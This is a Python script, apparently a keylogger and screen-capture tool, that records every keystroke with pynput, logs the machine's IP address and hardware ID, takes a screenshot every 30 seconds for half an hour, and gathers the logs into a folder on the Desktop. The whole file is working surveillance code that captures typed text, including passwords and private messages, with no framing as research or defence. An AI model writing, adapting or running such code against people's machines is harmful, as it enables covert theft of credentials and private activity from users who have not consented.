import time
import atexit
from pynput import keyboard
import socket
import uuid
import os
import pyautogui
import threading

def handle_key_press(key, file):
    try:
        key_name = key.char.encode('utf-8').decode('utf-8')
    except AttributeError:
        key_name = str(key)

    if key_name == "Key.enter":
        file.write("\n")
    elif key_name == "Key.space":
        file.write(" ")
    elif key_name == "Key.backspace":
        current_position = file.tell()
        if current_position > 0:
            file.seek(current_position - 1)
            file.truncate()
    else:
        file.write(key_name)

def record_key_presses():
    output_filename = "typed_text.txt"

    with open(output_filename, "w", encoding='utf-8') as file:
        listener = keyboard.Listener(on_press=lambda key: handle_key_press(key, file))
        listener.start()

        print("Recording key presses. Press Ctrl+C to stop...")
        try:
            while True:
                pass
        except KeyboardInterrupt:
            pass

        listener.stop()

    print(f"Typed text saved to {output_filename}.")
    move_files_to_data_folder()

def record_ip_and_hardware_id():
    output_filename = "system_info.txt"

    ip_address = socket.gethostbyname(socket.gethostname())
    hardware_id = str(uuid.getnode())

    try:
        with open(output_filename, "w") as file:
            file.write(f"IP Address: {ip_address}\n")
            file.write(f"Hardware ID: {hardware_id}\n")

        print(f"System information saved to {output_filename}.")
    except Exception as e:
        print(f"Error recording system information: {e}")

def move_files_to_data_folder():
    folder_path = os.path.join(os.path.expanduser("~"), "Desktop", "Recorded_Data")
    os.makedirs(folder_path, exist_ok=True)

    files_to_move = ["typed_text.txt", "system_info.txt"]

    for file_name in files_to_move:
        if os.path.isfile(file_name):
            os.replace(file_name, os.path.join(folder_path, file_name))

def capture_screenshot():
    current_time = time.time()
    end_time = current_time + 1800  # 30 minutes (30 minutes * 60 seconds)

    while time.time() < end_time:
        current_time = time.strftime("%Y%m%d-%H%M%S")
        file_name = f"screenshot_{current_time}.png"

        screenshot = pyautogui.screenshot()
        screenshot.save(file_name)

        print(f"Screenshot captured: {file_name}")
        time.sleep(30)

    # End the program after 30 minutes
    os._exit(0)

# Start a separate thread to capture screenshots
screenshot_thread = threading.Thread(target=capture_screenshot)
screenshot_thread.daemon = True
screenshot_thread.start()

# Record system information
record_ip_and_hardware_id()

# Record key presses
record_key_presses()

# Wait for screenshot thread to finish (not necessary in this case since it's a daemon thread)
screenshot_thread.join()
